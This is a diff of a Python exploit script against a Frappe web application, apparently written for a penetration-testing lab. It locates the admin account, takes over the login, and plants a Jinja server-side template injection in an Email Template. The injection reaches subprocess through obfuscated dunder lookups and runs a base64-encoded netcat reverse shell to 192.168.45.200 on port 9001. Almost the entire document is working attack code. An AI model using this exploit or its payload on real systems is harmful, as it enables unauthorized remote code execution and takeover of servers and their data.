@@ -3,9 +3,9 @@ import requests
 import subprocess
 import base64
 import json
-import datetime
+from datetime import datetime, timedelta
 requests.packages.urllib3.disable_warnings()
-from urllib.parse import quote
+from secrets import token_hex
 
 def send_sql_comamnd(ip, command):
 	target = f"http://{ip}:8000"
@@ -123,15 +123,14 @@ def login(ip, admin_email, password):
 	exit(0)
 
 def create_email_template(ip, session, admin_email):
-	curtime = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
-	
+	curtime = (datetime.utcnow() - timedelta(hours = 4)).strftime("%Y-%m-%d %H:%M:%S.%f")
+	print("Current time: ", curtime)
 	records = [{
 		"user":admin_email,
 		"creation": curtime,
 		"route":"List/Email Template/List"
 	}]
 
-	import urllib.parse
 	data = {
 		"doctype":"Route History",
 		"records": json.dumps(records)
@@ -141,6 +140,8 @@ def create_email_template(ip, session, admin_email):
 
 	r = session.post(target, data=data)
 	
+	template_name = token_hex(4)
+
 	doc = {
 		"docstatus":0,
 		"doctype":"Email Template",
@@ -148,7 +149,9 @@ def create_email_template(ip, session, admin_email):
 		"__islocal":1,
 		"__unsaved":1,
 		"owner":admin_email,
-		"__newname":"test3","subject":"test3","response":"<div>test3</div>"
+		"__newname":template_name,
+		"subject":"Pwned!",
+		"response":"<div>baseline</div>"
 	}
 
 	target = f"http://{ip}:8000/api/method/frappe.desk.form.save.savedocs"
@@ -157,40 +160,97 @@ def create_email_template(ip, session, admin_email):
 		"doc": json.dumps(doc),
 		"action": "Save"
 	}
-	
+
 	r = session.post(target, data=data)
 
-	return
+	return template_name
+
+# def update_template(ip, session, admin_email, template_name, template):
+# 	# Start by getting template information
+# 	target = f"http://{ip}:8000/api/method/frappe.desk.form.load.getdoc?doctype=Email+Template&name={template_name}"
+
+# 	r = session.get(target)
+# 	template_info = json.loads(r.text)
+
+# 	curtime = (datetime.utcnow() - timedelta(hours = 4)).strftime("%Y-%m-%d %H:%M:%S.%f")
+# 	creation_time = template_info["docs"][0]["creation"]
+# 	print("Got creation time :", creation_time)
+# 	print("Cur time: ", curtime)
+
+# 	doc = {
+# 		"modified":curtime,
+# 		"owner":admin_email,
+# 		"modified_by":admin_email,
+# 		"docstatus":0,
+# 		"idx":0,
+# 		"response":f"<div>{template}</div>",
+# 		"doctype":"Email Template",
+# 		"creation":creation_time,
+# 		"name":template_name,
+# 		"subject":"Pwned!"
+# 	}
+
+# 	target = f"http://{ip}:8000/api/method/frappe.desk.form.save.savedocs"
+
+# 	data = {
+# 		"doc": json.dumps(doc),
+# 		"action": "Save"
+# 	}
+
+# 	r = session.post(target, data=data)
+
+	# print(r.text)
+
+def execute_command(ip, session, command):
+
+	template = """
+	{{\% set string = "test" \%}}
+	{{\% set class = "\x5f\x5fclass\x5f\x5f" \%}}
+	{{\% set mro = "\x5f\x5fmro\x5f\x5f" \%}}
+	{{\% set subclasses = "\x5f\x5fsubclasses\x5f\x5f" \%}}
+	{{\% set mro = string|attr(class)|attr(mro) \%}}
+	{{\% set subclasses = mro[1]|attr(subclasses)() \%}}
+	{{\% set subprocess = subclasses[391] \%}}
+	{{\% set shellcode = "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIwMCA5MDAxID4vdG1wL2Y= | base64 -d  | sh" \%}}
+	{{{{subprocess(shellcode, shell=True)}}}}
+	"""
+
+	print(template)
+	# template_name = create_email_template(ip, session, admin_email, template)
+
 
 def main():
-    if len(sys.argv) != 2:
-        print ("(+) usage: %s <target>" % sys.argv[0])
-        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
-        sys.exit(-1)
+	if len(sys.argv) != 2:
+		print ("(+) usage: %s <target>" % sys.argv[0])
+		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
+		sys.exit(-1)
 
-    ip = sys.argv[1]
-    LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
-    LPORT = 9001
-    new_password = "PwnedPassword!"
+	ip = sys.argv[1]
+	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+	LPORT = 9001
+	new_password = "PwnedPassword!"
 
-    admin_email = get_admin_user_email(ip)
-    print(f"Admin email {admin_email} found!")
+	admin_email = get_admin_user_email(ip)
+	print(f"Admin email {admin_email} found!")
 
-    # print("Sending password reset......")
-    # send_reset_password(ip, admin_email)
+	# print("Sending password reset......")
+	# send_reset_password(ip, admin_email)
 
-    # print("Searching for password reset token")
-    # token = get_password_reset_token(ip, admin_email)
-    # print(f"Sucessfully got reset token {token}")
+	# print("Searching for password reset token")
+	# token = get_password_reset_token(ip, admin_email)
+	# print(f"Sucessfully got reset token {token}")
 
-    # print("Restting password")
-    # reset_password(ip, admin_email, token, new_password)
-    # print("Password reset succesfully!")
+	# print("Restting password")
+	# reset_password(ip, admin_email, token, new_password)
+	# print("Password reset succesfully!")
 
-    print("Logging in now")
-    session = login(ip, admin_email, new_password)
+	print("Logging in now")
+	session = login(ip, admin_email, new_password)
 
-    create_email_template(ip, session, admin_email)
+	execute_command(ip, session, "whoami")
+	# print(f"Created new template named: {template_name}")
+
+	# update_template(ip, session, admin_email, template_name, "baseline2")
 
 if __name__ == '__main__':
 	main()
